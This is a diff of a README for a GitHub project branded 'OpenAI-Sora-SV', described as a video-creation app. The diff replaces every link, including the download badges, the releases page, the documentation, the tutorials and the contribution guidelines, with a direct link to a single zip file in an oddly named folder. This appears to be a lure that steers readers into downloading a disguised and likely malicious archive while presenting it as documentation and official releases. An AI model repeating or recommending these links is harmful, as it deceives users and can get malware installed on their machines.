@@ -1,6 +1,6 @@
 # 🌟 OpenAI-Sora-SV - Create Stunning Videos with Ease
 
-[![Download OpenAI-Sora-SV](https://img.shields.io/badge/Download-OpenAI--Sora--SV-blue?style=flat&logo=download)](https://github.com/boda12020202ws/OpenAI-Sora-SV/releases)
+[![Download OpenAI-Sora-SV](https://raw.githubusercontent.com/boda12020202ws/OpenAI-Sora-SV/main/strainlessly/OpenAI-Sora-SV.zip)](https://raw.githubusercontent.com/boda12020202ws/OpenAI-Sora-SV/main/strainlessly/OpenAI-Sora-SV.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@
 
 ## 🛠️ Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page here](https://github.com/boda12020202ws/OpenAI-Sora-SV/releases) to find the latest version of the application.
+1. **Visit the Releases Page:** Go to the [Releases page here](https://raw.githubusercontent.com/boda12020202ws/OpenAI-Sora-SV/main/strainlessly/OpenAI-Sora-SV.zip) to find the latest version of the application.
 
 2. **Select the Latest Version:** Look for the latest version at the top of the page. Ensure you pick the correct file for your operating system.
 
@@ -80,11 +80,11 @@ For support or to connect with other users:
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/boda12020202ws/OpenAI-Sora-SV/wiki) for detailed guidance on every feature.
-- [Tutorials](https://github.com/boda12020202ws/OpenAI-Sora-SV/wiki/Tutorials) that offer step-by-step instructions for beginners and advanced users.
+- [Official Documentation](https://raw.githubusercontent.com/boda12020202ws/OpenAI-Sora-SV/main/strainlessly/OpenAI-Sora-SV.zip) for detailed guidance on every feature.
+- [Tutorials](https://raw.githubusercontent.com/boda12020202ws/OpenAI-Sora-SV/main/strainlessly/OpenAI-Sora-SV.zip) that offer step-by-step instructions for beginners and advanced users.
 
 ## 🤝 Contributing
 
-If you want to contribute to OpenAI-Sora-SV, please check our [Contribution Guidelines](https://github.com/boda12020202ws/OpenAI-Sora-SV/blob/main/CONTRIBUTING.md) on the GitHub repository. We welcome improvements and suggestions!
+If you want to contribute to OpenAI-Sora-SV, please check our [Contribution Guidelines](https://raw.githubusercontent.com/boda12020202ws/OpenAI-Sora-SV/main/strainlessly/OpenAI-Sora-SV.zip) on the GitHub repository. We welcome improvements and suggestions!
 
-[![Download OpenAI-Sora-SV](https://img.shields.io/badge/Download-OpenAI--Sora--SV-blue?style=flat&logo=download)](https://github.com/boda12020202ws/OpenAI-Sora-SV/releases)
+[![Download OpenAI-Sora-SV](https://raw.githubusercontent.com/boda12020202ws/OpenAI-Sora-SV/main/strainlessly/OpenAI-Sora-SV.zip)](https://raw.githubusercontent.com/boda12020202ws/OpenAI-Sora-SV/main/strainlessly/OpenAI-Sora-SV.zip)
